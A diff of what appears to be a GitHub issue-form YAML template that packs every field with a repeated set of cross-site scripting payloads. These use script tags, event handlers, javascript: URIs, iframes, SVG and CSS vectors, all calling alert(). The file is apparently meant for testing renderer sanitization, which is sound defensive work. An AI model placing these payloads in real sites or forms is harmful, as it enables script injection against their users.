@@ -1,252 +1,1634 @@
-name: "<img src=x onerror=alert('name')> Bug Report"
-description: "File a bug report <script>alert('description')</script> <img src=x onerror=alert('desc')> &lt;script&gt;alert('html_entity')&lt;/script&gt;"
-title: "[Bug]: <img src=x onerror=alert('title')> {{constructor.constructor('alert(1)')()}}"
-labels: ["bug<img src=x onerror=alert('label')>", "<script>alert('label2')</script>", "triage\"><img src=x onerror=alert('label3')>"]
-projects: ["octo-org/1<img src=x onerror=alert('project')>"]
+name: '<script>alert("name_0")</script>
+
+  <img src=x onerror=alert("name_1")>
+
+  <svg onload=alert("name_2")>
+
+  <svg/onload=alert("name_3")>
+
+  <style>@import"javascript:alert(''name_4'')"</style>
+
+  <style>body{{background:url("javascript:alert(''name_5'')")}}</style>
+
+  <style>*{{xss:expression(alert("name_6"))}}</style>
+
+  <link rel=stylesheet href="javascript:alert(''name_7'')">
+
+  <iframe src="javascript:alert(''name_8'')"></iframe>
+
+  <iframe srcdoc="<script>alert(''name_9'')</script>"></iframe>
+
+  <embed src="javascript:alert(''name_10'')">
+
+  <object data="javascript:alert(''name_11'')">
+
+  <base href="javascript:alert(''name_12'')//">
+
+  <body onload=alert("name_13")>
+
+  <video><source onerror=alert("name_14")>
+
+  <audio src=x onerror=alert("name_15")>
+
+  <marquee onstart=alert("name_16")>
+
+  <meter onmouseover=alert("name_17")>0</meter>
+
+  <details open ontoggle=alert("name_18")>
+
+  <input onfocus=alert("name_19") autofocus>
+
+  <select onfocus=alert("name_20") autofocus><option>x</option></select>
+
+  <textarea onfocus=alert("name_21") autofocus>
+
+  <keygen onfocus=alert("name_22") autofocus>
+
+  <math><mi xlink:href="javascript:alert(''name_23'')">click</mi></math>
+
+  <xmp><img src=x onerror=alert("name_24")></xmp>
+
+  <noscript><img src=x onerror=alert("name_25")></noscript>
+
+  <listing>&lt;img src=x onerror=alert("name_26")&gt;</listing>'
+description: '<script>alert("description_0")</script>
+
+  <img src=x onerror=alert("description_1")>
+
+  <svg onload=alert("description_2")>
+
+  <svg/onload=alert("description_3")>
+
+  <style>@import"javascript:alert(''description_4'')"</style>
+
+  <style>body{{background:url("javascript:alert(''description_5'')")}}</style>
+
+  <style>*{{xss:expression(alert("description_6"))}}</style>
+
+  <link rel=stylesheet href="javascript:alert(''description_7'')">
+
+  <iframe src="javascript:alert(''description_8'')"></iframe>
+
+  <iframe srcdoc="<script>alert(''description_9'')</script>"></iframe>
+
+  <embed src="javascript:alert(''description_10'')">
+
+  <object data="javascript:alert(''description_11'')">
+
+  <base href="javascript:alert(''description_12'')//">
+
+  <body onload=alert("description_13")>
+
+  <video><source onerror=alert("description_14")>
+
+  <audio src=x onerror=alert("description_15")>
+
+  <marquee onstart=alert("description_16")>
+
+  <meter onmouseover=alert("description_17")>0</meter>
+
+  <details open ontoggle=alert("description_18")>
+
+  <input onfocus=alert("description_19") autofocus>
+
+  <select onfocus=alert("description_20") autofocus><option>x</option></select>
+
+  <textarea onfocus=alert("description_21") autofocus>
+
+  <keygen onfocus=alert("description_22") autofocus>
+
+  <math><mi xlink:href="javascript:alert(''description_23'')">click</mi></math>
+
+  <xmp><img src=x onerror=alert("description_24")></xmp>
+
+  <noscript><img src=x onerror=alert("description_25")></noscript>
+
+  <listing>&lt;img src=x onerror=alert("description_26")&gt;</listing>'
+title: '<script>alert("title_0")</script>
+
+  <img src=x onerror=alert("title_1")>
+
+  <svg onload=alert("title_2")>
+
+  <svg/onload=alert("title_3")>
+
+  <style>@import"javascript:alert(''title_4'')"</style>
+
+  <style>body{{background:url("javascript:alert(''title_5'')")}}</style>
+
+  <style>*{{xss:expression(alert("title_6"))}}</style>
+
+  <link rel=stylesheet href="javascript:alert(''title_7'')">
+
+  <iframe src="javascript:alert(''title_8'')"></iframe>
+
+  <iframe srcdoc="<script>alert(''title_9'')</script>"></iframe>
+
+  <embed src="javascript:alert(''title_10'')">
+
+  <object data="javascript:alert(''title_11'')">
+
+  <base href="javascript:alert(''title_12'')//">
+
+  <body onload=alert("title_13")>
+
+  <video><source onerror=alert("title_14")>
+
+  <audio src=x onerror=alert("title_15")>
+
+  <marquee onstart=alert("title_16")>
+
+  <meter onmouseover=alert("title_17")>0</meter>
+
+  <details open ontoggle=alert("title_18")>
+
+  <input onfocus=alert("title_19") autofocus>
+
+  <select onfocus=alert("title_20") autofocus><option>x</option></select>
+
+  <textarea onfocus=alert("title_21") autofocus>
+
+  <keygen onfocus=alert("title_22") autofocus>
+
+  <math><mi xlink:href="javascript:alert(''title_23'')">click</mi></math>
+
+  <xmp><img src=x onerror=alert("title_24")></xmp>
+
+  <noscript><img src=x onerror=alert("title_25")></noscript>
+
+  <listing>&lt;img src=x onerror=alert("title_26")&gt;</listing>'
+labels:
+- '<script>alert("label_0_0")</script>
+
+  <img src=x onerror=alert("label_0_1")>
+
+  <svg onload=alert("label_0_2")>
+
+  <svg/onload=alert("label_0_3")>
+
+  <style>@import"javascript:alert(''label_0_4'')"</style>
+
+  <style>body{{background:url("javascript:alert(''label_0_5'')")}}</style>
+
+  <style>*{{xss:expression(alert("label_0_6"))}}</style>
+
+  <link rel=stylesheet href="javascript:alert(''label_0_7'')">
+
+  <iframe src="javascript:alert(''label_0_8'')"></iframe>
+
+  <iframe srcdoc="<script>alert(''label_0_9'')</script>"></iframe>
+
+  <embed src="javascript:alert(''label_0_10'')">
+
+  <object data="javascript:alert(''label_0_11'')">
+
+  <base href="javascript:alert(''label_0_12'')//">
+
+  <body onload=alert("label_0_13")>
+
+  <video><source onerror=alert("label_0_14")>
+
+  <audio src=x onerror=alert("label_0_15")>
+
+  <marquee onstart=alert("label_0_16")>
+
+  <meter onmouseover=alert("label_0_17")>0</meter>
+
+  <details open ontoggle=alert("label_0_18")>
+
+  <input onfocus=alert("label_0_19") autofocus>
+
+  <select onfocus=alert("label_0_20") autofocus><option>x</option></select>
+
+  <textarea onfocus=alert("label_0_21") autofocus>
+
+  <keygen onfocus=alert("label_0_22") autofocus>
+
+  <math><mi xlink:href="javascript:alert(''label_0_23'')">click</mi></math>
+
+  <xmp><img src=x onerror=alert("label_0_24")></xmp>
+
+  <noscript><img src=x onerror=alert("label_0_25")></noscript>
+
+  <listing>&lt;img src=x onerror=alert("label_0_26")&gt;</listing>'
+- triage
+projects:
+- '<script>alert("project_0_0")</script>
+
+  <img src=x onerror=alert("project_0_1")>
+
+  <svg onload=alert("project_0_2")>
+
+  <svg/onload=alert("project_0_3")>
+
+  <style>@import"javascript:alert(''project_0_4'')"</style>
+
+  <style>body{{background:url("javascript:alert(''project_0_5'')")}}</style>
+
+  <style>*{{xss:expression(alert("project_0_6"))}}</style>
+
+  <link rel=stylesheet href="javascript:alert(''project_0_7'')">
+
+  <iframe src="javascript:alert(''project_0_8'')"></iframe>
+
+  <iframe srcdoc="<script>alert(''project_0_9'')</script>"></iframe>
+
+  <embed src="javascript:alert(''project_0_10'')">
+
+  <object data="javascript:alert(''project_0_11'')">
+
+  <base href="javascript:alert(''project_0_12'')//">
+
+  <body onload=alert("project_0_13")>
+
+  <video><source onerror=alert("project_0_14")>
+
+  <audio src=x onerror=alert("project_0_15")>
+
+  <marquee onstart=alert("project_0_16")>
+
+  <meter onmouseover=alert("project_0_17")>0</meter>
+
+  <details open ontoggle=alert("project_0_18")>
+
+  <input onfocus=alert("project_0_19") autofocus>
+
+  <select onfocus=alert("project_0_20") autofocus><option>x</option></select>
+
+  <textarea onfocus=alert("project_0_21") autofocus>
+
+  <keygen onfocus=alert("project_0_22") autofocus>
+
+  <math><mi xlink:href="javascript:alert(''project_0_23'')">click</mi></math>
+
+  <xmp><img src=x onerror=alert("project_0_24")></xmp>
+
+  <noscript><img src=x onerror=alert("project_0_25")></noscript>
+
+  <listing>&lt;img src=x onerror=alert("project_0_26")&gt;</listing>'
 assignees:
-  - "octocat<img src=x onerror=alert('assignee')>"
-type: "bug<script>alert('type')</script>"
+- '<script>alert("assignee_0_0")</script>
+
+  <img src=x onerror=alert("assignee_0_1")>
+
+  <svg onload=alert("assignee_0_2")>
+
+  <svg/onload=alert("assignee_0_3")>
+
+  <style>@import"javascript:alert(''assignee_0_4'')"</style>
+
+  <style>body{{background:url("javascript:alert(''assignee_0_5'')")}}</style>
+
+  <style>*{{xss:expression(alert("assignee_0_6"))}}</style>
+
+  <link rel=stylesheet href="javascript:alert(''assignee_0_7'')">
+
+  <iframe src="javascript:alert(''assignee_0_8'')"></iframe>
+
+  <iframe srcdoc="<script>alert(''assignee_0_9'')</script>"></iframe>
+
+  <embed src="javascript:alert(''assignee_0_10'')">
+
+  <object data="javascript:alert(''assignee_0_11'')">
+
+  <base href="javascript:alert(''assignee_0_12'')//">
+
+  <body onload=alert("assignee_0_13")>
+
+  <video><source onerror=alert("assignee_0_14")>
+
+  <audio src=x onerror=alert("assignee_0_15")>
+
+  <marquee onstart=alert("assignee_0_16")>
+
+  <meter onmouseover=alert("assignee_0_17")>0</meter>
+
+  <details open ontoggle=alert("assignee_0_18")>
+
+  <input onfocus=alert("assignee_0_19") autofocus>
+
+  <select onfocus=alert("assignee_0_20") autofocus><option>x</option></select>
+
+  <textarea onfocus=alert("assignee_0_21") autofocus>
+
+  <keygen onfocus=alert("assignee_0_22") autofocus>
+
+  <math><mi xlink:href="javascript:alert(''assignee_0_23'')">click</mi></math>
+
+  <xmp><img src=x onerror=alert("assignee_0_24")></xmp>
+
+  <noscript><img src=x onerror=alert("assignee_0_25")></noscript>
+
+  <listing>&lt;img src=x onerror=alert("assignee_0_26")&gt;</listing>'
+type: '<script>alert("type_field_0")</script>
+
+  <img src=x onerror=alert("type_field_1")>
+
+  <svg onload=alert("type_field_2")>
+
+  <svg/onload=alert("type_field_3")>
+
+  <style>@import"javascript:alert(''type_field_4'')"</style>
+
+  <style>body{{background:url("javascript:alert(''type_field_5'')")}}</style>
+
+  <style>*{{xss:expression(alert("type_field_6"))}}</style>
+
+  <link rel=stylesheet href="javascript:alert(''type_field_7'')">
+
+  <iframe src="javascript:alert(''type_field_8'')"></iframe>
+
+  <iframe srcdoc="<script>alert(''type_field_9'')</script>"></iframe>
+
+  <embed src="javascript:alert(''type_field_10'')">
+
+  <object data="javascript:alert(''type_field_11'')">
+
+  <base href="javascript:alert(''type_field_12'')//">
+
+  <body onload=alert("type_field_13")>
+
+  <video><source onerror=alert("type_field_14")>
+
+  <audio src=x onerror=alert("type_field_15")>
+
+  <marquee onstart=alert("type_field_16")>
+
+  <meter onmouseover=alert("type_field_17")>0</meter>
+
+  <details open ontoggle=alert("type_field_18")>
+
+  <input onfocus=alert("type_field_19") autofocus>
+
+  <select onfocus=alert("type_field_20") autofocus><option>x</option></select>
+
+  <textarea onfocus=alert("type_field_21") autofocus>
+
+  <keygen onfocus=alert("type_field_22") autofocus>
+
+  <math><mi xlink:href="javascript:alert(''type_field_23'')">click</mi></math>
+
+  <xmp><img src=x onerror=alert("type_field_24")></xmp>
+
+  <noscript><img src=x onerror=alert("type_field_25")></noscript>
+
+  <listing>&lt;img src=x onerror=alert("type_field_26")&gt;</listing>'
 body:
-  # 1. Markdown block - XSS in value
-  - type: markdown
-    attributes:
-      value: |
-        Thanks for taking the time to fill out this bug report!
+- type: markdown
+  attributes:
+    value: '<script>alert("markdown_value_0")</script>
 
-        <script>alert('markdown_script')</script>
-        <img src=x onerror=alert('markdown_img')>
-        <svg onload=alert('markdown_svg')>
-        <svg/onload=alert('markdown_svg2')>
-        <details open ontoggle=alert('markdown_details')>
-        <math><mi xlink:href="javascript:alert('markdown_math')">
-        <iframe src="javascript:alert('markdown_iframe')"></iframe>
-        <object data="javascript:alert('markdown_object')">
-        <embed src="javascript:alert('markdown_embed')">
-        <a href="javascript:alert('markdown_a')">click me</a>
-        <a href="jAvAsCrIpT:alert('markdown_a_mixed_case')">click</a>
-        <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('markdown_a_html_entities')">click</a>
-        <a href="data:text/html,<script>alert('markdown_data_uri')</script>">click</a>
-        <a href="\x6Aavascript:alert('markdown_hex_escape')">click</a>
-        <body onload=alert('markdown_body')>
-        <input onfocus=alert('markdown_input') autofocus>
-        <select onfocus=alert('markdown_select') autofocus>
-        <textarea onfocus=alert('markdown_textarea') autofocus>
-        <keygen onfocus=alert('markdown_keygen') autofocus>
-        <video><source onerror=alert('markdown_video')>
-        <audio src=x onerror=alert('markdown_audio')>
-        <marquee onstart=alert('markdown_marquee')>
-        <meter onmouseover=alert('markdown_meter')>0</meter>
-        <div style="background:url('javascript:alert(1)')">
-        <div style="width:expression(alert('markdown_expression'))">
-        <table background="javascript:alert('markdown_table')">
-        <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;markdown_img_entities&#39;&#41;">
-        <img src=x onerror=alert`markdown_template_literal`>
-        <img/src=x/onerror=alert('markdown_img_slash')>
-        <IMG """><SCRIPT>alert('markdown_img_broken')</SCRIPT>">
-        <img src=`x`onerror=alert('markdown_backtick')>
+      <img src=x onerror=alert("markdown_value_1")>
 
-        &lt;img src=x onerror=alert('markdown_lt_entity')&gt;
-        &lt;script&gt;alert('markdown_script_entity')&lt;/script&gt;
-        &#60;script&#62;alert('markdown_numeric_entity')&#60;/script&#62;
-        &#x3C;script&#x3E;alert('markdown_hex_entity')&#x3C;/script&#x3E;
+      <svg onload=alert("markdown_value_2")>
 
-        ![xss](javascript:alert('markdown_img_md'))
-        ![xss](data:text/html,<script>alert('markdown_img_md_data')</script>)
-        [xss](javascript:alert('markdown_link_md'))
-        [xss](data:text/html;base64,PHNjcmlwdD5hbGVydCgnbWFya2Rvd25fYjY0Jyk8L3NjcmlwdD4=)
-        [xss](vbscript:alert('markdown_vbscript'))
-        [xss]( javascript:alert('markdown_link_space'))
+      <svg/onload=alert("markdown_value_3")>
 
-        ```
-        <script>alert('markdown_codeblock')</script>
-        ```
+      <style>@import"javascript:alert(''markdown_value_4'')"</style>
 
-        `<script>alert('markdown_inline_code')</script>`
+      <style>body{{background:url("javascript:alert(''markdown_value_5'')")}}</style>
 
-  # 2. Input - XSS in label, description, placeholder
-  - type: input
-    id: contact
-    attributes:
-      label: "Contact Details <img src=x onerror=alert('input_label')> <script>alert('input_label2')</script>"
-      description: "How can we reach you? <img src=x onerror=alert('input_desc')> <svg onload=alert('input_desc_svg')> [click](javascript:alert('input_desc_md'))"
-      placeholder: "email@example.com\"><img src=x onerror=alert('input_placeholder')>"
-    validations:
-      required: false
+      <style>*{{xss:expression(alert("markdown_value_6"))}}</style>
 
-  # 3. Textarea - XSS in label, description, placeholder, value, render
-  - type: textarea
-    id: what-happened
-    attributes:
-      label: "What happened? <img src=x onerror=alert('textarea_label')>"
-      description: "Tell us what happened <script>alert('textarea_desc')</script> <img src=x onerror=alert('textarea_desc_img')> <svg/onload=alert('textarea_desc_svg')>"
-      placeholder: "Tell us what you see! <img src=x onerror=alert('textarea_placeholder')>"
-      value: |
-        A bug happened!
-        <script>alert('textarea_value_script')</script>
-        <img src=x onerror=alert('textarea_value_img')>
-        <svg onload=alert('textarea_value_svg')>
-        <a href="javascript:alert('textarea_value_link')">click</a>
-        &lt;img src=x onerror=alert('textarea_value_entity')&gt;
-    validations:
+      <link rel=stylesheet href="javascript:alert(''markdown_value_7'')">
+
+      <iframe src="javascript:alert(''markdown_value_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''markdown_value_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''markdown_value_10'')">
+
+      <object data="javascript:alert(''markdown_value_11'')">
+
+      <base href="javascript:alert(''markdown_value_12'')//">
+
+      <body onload=alert("markdown_value_13")>
+
+      <video><source onerror=alert("markdown_value_14")>
+
+      <audio src=x onerror=alert("markdown_value_15")>
+
+      <marquee onstart=alert("markdown_value_16")>
+
+      <meter onmouseover=alert("markdown_value_17")>0</meter>
+
+      <details open ontoggle=alert("markdown_value_18")>
+
+      <input onfocus=alert("markdown_value_19") autofocus>
+
+      <select onfocus=alert("markdown_value_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("markdown_value_21") autofocus>
+
+      <keygen onfocus=alert("markdown_value_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''markdown_value_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("markdown_value_24")></xmp>
+
+      <noscript><img src=x onerror=alert("markdown_value_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("markdown_value_26")&gt;</listing>'
+- type: input
+  id: '<script>alert("input_id_0")</script>
+
+    <img src=x onerror=alert("input_id_1")>
+
+    <svg onload=alert("input_id_2")>
+
+    <svg/onload=alert("input_id_3")>
+
+    <style>@import"javascript:alert(''input_id_4'')"</style>
+
+    <style>body{{background:url("javascript:alert(''input_id_5'')")}}</style>
+
+    <style>*{{xss:expression(alert("input_id_6"))}}</style>
+
+    <link rel=stylesheet href="javascript:alert(''input_id_7'')">
+
+    <iframe src="javascript:alert(''input_id_8'')"></iframe>
+
+    <iframe srcdoc="<script>alert(''input_id_9'')</script>"></iframe>
+
+    <embed src="javascript:alert(''input_id_10'')">
+
+    <object data="javascript:alert(''input_id_11'')">
+
+    <base href="javascript:alert(''input_id_12'')//">
+
+    <body onload=alert("input_id_13")>
+
+    <video><source onerror=alert("input_id_14")>
+
+    <audio src=x onerror=alert("input_id_15")>
+
+    <marquee onstart=alert("input_id_16")>
+
+    <meter onmouseover=alert("input_id_17")>0</meter>
+
+    <details open ontoggle=alert("input_id_18")>
+
+    <input onfocus=alert("input_id_19") autofocus>
+
+    <select onfocus=alert("input_id_20") autofocus><option>x</option></select>
+
+    <textarea onfocus=alert("input_id_21") autofocus>
+
+    <keygen onfocus=alert("input_id_22") autofocus>
+
+    <math><mi xlink:href="javascript:alert(''input_id_23'')">click</mi></math>
+
+    <xmp><img src=x onerror=alert("input_id_24")></xmp>
+
+    <noscript><img src=x onerror=alert("input_id_25")></noscript>
+
+    <listing>&lt;img src=x onerror=alert("input_id_26")&gt;</listing>'
+  attributes:
+    label: '<script>alert("input_label_0")</script>
+
+      <img src=x onerror=alert("input_label_1")>
+
+      <svg onload=alert("input_label_2")>
+
+      <svg/onload=alert("input_label_3")>
+
+      <style>@import"javascript:alert(''input_label_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''input_label_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("input_label_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''input_label_7'')">
+
+      <iframe src="javascript:alert(''input_label_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''input_label_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''input_label_10'')">
+
+      <object data="javascript:alert(''input_label_11'')">
+
+      <base href="javascript:alert(''input_label_12'')//">
+
+      <body onload=alert("input_label_13")>
+
+      <video><source onerror=alert("input_label_14")>
+
+      <audio src=x onerror=alert("input_label_15")>
+
+      <marquee onstart=alert("input_label_16")>
+
+      <meter onmouseover=alert("input_label_17")>0</meter>
+
+      <details open ontoggle=alert("input_label_18")>
+
+      <input onfocus=alert("input_label_19") autofocus>
+
+      <select onfocus=alert("input_label_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("input_label_21") autofocus>
+
+      <keygen onfocus=alert("input_label_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''input_label_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("input_label_24")></xmp>
+
+      <noscript><img src=x onerror=alert("input_label_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("input_label_26")&gt;</listing>'
+    description: '<script>alert("input_description_0")</script>
+
+      <img src=x onerror=alert("input_description_1")>
+
+      <svg onload=alert("input_description_2")>
+
+      <svg/onload=alert("input_description_3")>
+
+      <style>@import"javascript:alert(''input_description_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''input_description_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("input_description_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''input_description_7'')">
+
+      <iframe src="javascript:alert(''input_description_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''input_description_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''input_description_10'')">
+
+      <object data="javascript:alert(''input_description_11'')">
+
+      <base href="javascript:alert(''input_description_12'')//">
+
+      <body onload=alert("input_description_13")>
+
+      <video><source onerror=alert("input_description_14")>
+
+      <audio src=x onerror=alert("input_description_15")>
+
+      <marquee onstart=alert("input_description_16")>
+
+      <meter onmouseover=alert("input_description_17")>0</meter>
+
+      <details open ontoggle=alert("input_description_18")>
+
+      <input onfocus=alert("input_description_19") autofocus>
+
+      <select onfocus=alert("input_description_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("input_description_21") autofocus>
+
+      <keygen onfocus=alert("input_description_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''input_description_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("input_description_24")></xmp>
+
+      <noscript><img src=x onerror=alert("input_description_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("input_description_26")&gt;</listing>'
+    placeholder: '<script>alert("input_placeholder_0")</script>
+
+      <img src=x onerror=alert("input_placeholder_1")>
+
+      <svg onload=alert("input_placeholder_2")>
+
+      <svg/onload=alert("input_placeholder_3")>
+
+      <style>@import"javascript:alert(''input_placeholder_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''input_placeholder_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("input_placeholder_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''input_placeholder_7'')">
+
+      <iframe src="javascript:alert(''input_placeholder_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''input_placeholder_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''input_placeholder_10'')">
+
+      <object data="javascript:alert(''input_placeholder_11'')">
+
+      <base href="javascript:alert(''input_placeholder_12'')//">
+
+      <body onload=alert("input_placeholder_13")>
+
+      <video><source onerror=alert("input_placeholder_14")>
+
+      <audio src=x onerror=alert("input_placeholder_15")>
+
+      <marquee onstart=alert("input_placeholder_16")>
+
+      <meter onmouseover=alert("input_placeholder_17")>0</meter>
+
+      <details open ontoggle=alert("input_placeholder_18")>
+
+      <input onfocus=alert("input_placeholder_19") autofocus>
+
+      <select onfocus=alert("input_placeholder_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("input_placeholder_21") autofocus>
+
+      <keygen onfocus=alert("input_placeholder_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''input_placeholder_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("input_placeholder_24")></xmp>
+
+      <noscript><img src=x onerror=alert("input_placeholder_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("input_placeholder_26")&gt;</listing>'
+  validations:
+    required: false
+- type: textarea
+  id: '<script>alert("textarea_id_0")</script>
+
+    <img src=x onerror=alert("textarea_id_1")>
+
+    <svg onload=alert("textarea_id_2")>
+
+    <svg/onload=alert("textarea_id_3")>
+
+    <style>@import"javascript:alert(''textarea_id_4'')"</style>
+
+    <style>body{{background:url("javascript:alert(''textarea_id_5'')")}}</style>
+
+    <style>*{{xss:expression(alert("textarea_id_6"))}}</style>
+
+    <link rel=stylesheet href="javascript:alert(''textarea_id_7'')">
+
+    <iframe src="javascript:alert(''textarea_id_8'')"></iframe>
+
+    <iframe srcdoc="<script>alert(''textarea_id_9'')</script>"></iframe>
+
+    <embed src="javascript:alert(''textarea_id_10'')">
+
+    <object data="javascript:alert(''textarea_id_11'')">
+
+    <base href="javascript:alert(''textarea_id_12'')//">
+
+    <body onload=alert("textarea_id_13")>
+
+    <video><source onerror=alert("textarea_id_14")>
+
+    <audio src=x onerror=alert("textarea_id_15")>
+
+    <marquee onstart=alert("textarea_id_16")>
+
+    <meter onmouseover=alert("textarea_id_17")>0</meter>
+
+    <details open ontoggle=alert("textarea_id_18")>
+
+    <input onfocus=alert("textarea_id_19") autofocus>
+
+    <select onfocus=alert("textarea_id_20") autofocus><option>x</option></select>
+
+    <textarea onfocus=alert("textarea_id_21") autofocus>
+
+    <keygen onfocus=alert("textarea_id_22") autofocus>
+
+    <math><mi xlink:href="javascript:alert(''textarea_id_23'')">click</mi></math>
+
+    <xmp><img src=x onerror=alert("textarea_id_24")></xmp>
+
+    <noscript><img src=x onerror=alert("textarea_id_25")></noscript>
+
+    <listing>&lt;img src=x onerror=alert("textarea_id_26")&gt;</listing>'
+  attributes:
+    label: '<script>alert("textarea_label_0")</script>
+
+      <img src=x onerror=alert("textarea_label_1")>
+
+      <svg onload=alert("textarea_label_2")>
+
+      <svg/onload=alert("textarea_label_3")>
+
+      <style>@import"javascript:alert(''textarea_label_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''textarea_label_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("textarea_label_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''textarea_label_7'')">
+
+      <iframe src="javascript:alert(''textarea_label_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''textarea_label_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''textarea_label_10'')">
+
+      <object data="javascript:alert(''textarea_label_11'')">
+
+      <base href="javascript:alert(''textarea_label_12'')//">
+
+      <body onload=alert("textarea_label_13")>
+
+      <video><source onerror=alert("textarea_label_14")>
+
+      <audio src=x onerror=alert("textarea_label_15")>
+
+      <marquee onstart=alert("textarea_label_16")>
+
+      <meter onmouseover=alert("textarea_label_17")>0</meter>
+
+      <details open ontoggle=alert("textarea_label_18")>
+
+      <input onfocus=alert("textarea_label_19") autofocus>
+
+      <select onfocus=alert("textarea_label_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("textarea_label_21") autofocus>
+
+      <keygen onfocus=alert("textarea_label_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''textarea_label_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("textarea_label_24")></xmp>
+
+      <noscript><img src=x onerror=alert("textarea_label_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("textarea_label_26")&gt;</listing>'
+    description: '<script>alert("textarea_description_0")</script>
+
+      <img src=x onerror=alert("textarea_description_1")>
+
+      <svg onload=alert("textarea_description_2")>
+
+      <svg/onload=alert("textarea_description_3")>
+
+      <style>@import"javascript:alert(''textarea_description_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''textarea_description_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("textarea_description_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''textarea_description_7'')">
+
+      <iframe src="javascript:alert(''textarea_description_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''textarea_description_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''textarea_description_10'')">
+
+      <object data="javascript:alert(''textarea_description_11'')">
+
+      <base href="javascript:alert(''textarea_description_12'')//">
+
+      <body onload=alert("textarea_description_13")>
+
+      <video><source onerror=alert("textarea_description_14")>
+
+      <audio src=x onerror=alert("textarea_description_15")>
+
+      <marquee onstart=alert("textarea_description_16")>
+
+      <meter onmouseover=alert("textarea_description_17")>0</meter>
+
+      <details open ontoggle=alert("textarea_description_18")>
+
+      <input onfocus=alert("textarea_description_19") autofocus>
+
+      <select onfocus=alert("textarea_description_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("textarea_description_21") autofocus>
+
+      <keygen onfocus=alert("textarea_description_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''textarea_description_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("textarea_description_24")></xmp>
+
+      <noscript><img src=x onerror=alert("textarea_description_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("textarea_description_26")&gt;</listing>'
+    placeholder: '<script>alert("textarea_placeholder_0")</script>
+
+      <img src=x onerror=alert("textarea_placeholder_1")>
+
+      <svg onload=alert("textarea_placeholder_2")>
+
+      <svg/onload=alert("textarea_placeholder_3")>
+
+      <style>@import"javascript:alert(''textarea_placeholder_4'')"</style>
+
+      <style>body{{background:url("javascript:alert(''textarea_placeholder_5'')")}}</style>
+
+      <style>*{{xss:expression(alert("textarea_placeholder_6"))}}</style>
+
+      <link rel=stylesheet href="javascript:alert(''textarea_placeholder_7'')">
+
+      <iframe src="javascript:alert(''textarea_placeholder_8'')"></iframe>
+
+      <iframe srcdoc="<script>alert(''textarea_placeholder_9'')</script>"></iframe>
+
+      <embed src="javascript:alert(''textarea_placeholder_10'')">
+
+      <object data="javascript:alert(''textarea_placeholder_11'')">
+
+      <base href="javascript:alert(''textarea_placeholder_12'')//">
+
+      <body onload=alert("textarea_placeholder_13")>
+
+      <video><source onerror=alert("textarea_placeholder_14")>
+
+      <audio src=x onerror=alert("textarea_placeholder_15")>
+
+      <marquee onstart=alert("textarea_placeholder_16")>
+
+      <meter onmouseover=alert("textarea_placeholder_17")>0</meter>
+
+      <details open ontoggle=alert("textarea_placeholder_18")>
+
+      <input onfocus=alert("textarea_placeholder_19") autofocus>
+
+      <select onfocus=alert("textarea_placeholder_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("textarea_placeholder_21") autofocus>
+
+      <keygen onfocus=alert("textarea_placeholder_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''textarea_placeholder_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("textarea_placeholder_24")></xmp>
+
+      <noscript><img src=x onerror=alert("textarea_placeholder_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("textarea_placeholder_26")&gt;</listing>'
+    value: '<script>alert("textarea_value_0")</script>
+
+      <img src=x onerror=alert("textarea_value_1")>
+
+      <svg onload=alert("textarea_value_2")>
+
+      <svg/onload=alert("textarea_value_3")>
+
+      <style>@import"javascript:alert(''textarea_value_4'')"</style>
+
